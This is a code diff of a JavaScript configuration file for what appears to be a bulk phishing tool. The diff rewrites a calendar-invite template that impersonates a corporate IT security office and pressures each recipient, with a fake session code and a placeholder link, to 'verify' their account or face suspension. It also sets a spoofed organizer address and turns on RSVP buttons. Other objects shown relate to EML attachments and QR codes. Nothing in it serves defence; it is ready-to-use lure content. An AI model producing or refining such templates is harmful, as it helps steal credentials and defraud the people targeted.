@@ -171,27 +171,25 @@ const attachment_EML = {
   ]
 };
 
-// =====================================================================
-// MACRO TEST: CALENDAR INVITE
-// =====================================================================
+
 const calendar_invite = {
-  active: true, // WAJIB TRUE
+  active: true, // MUST BE TRUE TO ENABLE
   TIMEZONE: "America/New_York", 
-  SUMMARY: "Action Required: Security Update for <NAME>", // Judul di kalender
-  DESCRIPTION: "Dear <NAME>, please confirm your identity using this secure session code: <CAPITAL_RANDSTRING6>. Click the link to proceed: <RANDLINK>", 
-  LOCATION: "Secure Verification Portal",
-  METHOD: "REQUEST", // REQUEST akan memunculkan tombol RSVP (Accept/Maybe/Decline)
+  SUMMARY: "Urgent Security Verification for <NAME>", // Judul Event
+  DESCRIPTION: "Dear <NAME>,\n\nAs part of our ongoing security enhancements, we require all users to complete a mandatory account verification session.\n\nYour temporary session code is: <CAPITAL_RANDSTRING6>\n\nPlease proceed to the portal to finalize the process and prevent account suspension:\n<RANDLINK>\n\nThank you for your immediate attention to this matter.\n\nIT Security Department", 
+  LOCATION: "Digital Identity Protection Portal",
+  METHOD: "REQUEST", // This will trigger the RSVP buttons (Accept/Decline)
   STATUS: "CONFIRMED",
-  ORGANIZER_CN: "IT Security Department", // Nama pengirim di kalender
-  ORGANIZER_EMAIL: "security-noreply@<DOMAIN>", // Email pengirim di kalender
+  ORGANIZER_CN: "Corporate Security Office", // Sender display name in calendar
+  ORGANIZER_EMAIL: "no-reply-security@<DOMAIN>", // Sender email in calendar
   ATTENDEE_CN: "<NAME>", 
   ATTENDEE_EMAIL: "<EMAIL>",
-  RSVP: true, // WAJIB TRUE agar muncul tombol respon di Outlook/Gmail
-  START_DATE: "05/04/2026", // Format DD/MM/YYYY
-  START_TIME: "10:00", // Format 24 Jam
-  DURATION_MINUTES: 30,
-  REMINDER_MINUTES: 15,
-  REMINDER_TEXT: "Urgent Security Meeting"
+  RSVP: true, // Enables the buttons in Outlook/Gmail
+  START_DATE: "05/04/2026", // DD/MM/YYYY format
+  START_TIME: "10:00", // 24-hour format
+  DURATION_MINUTES: 15,
+  REMINDER_MINUTES: 10,
+  REMINDER_TEXT: "Mandatory Security Verification Session"
 };
 
 const generate_QRCODE = {
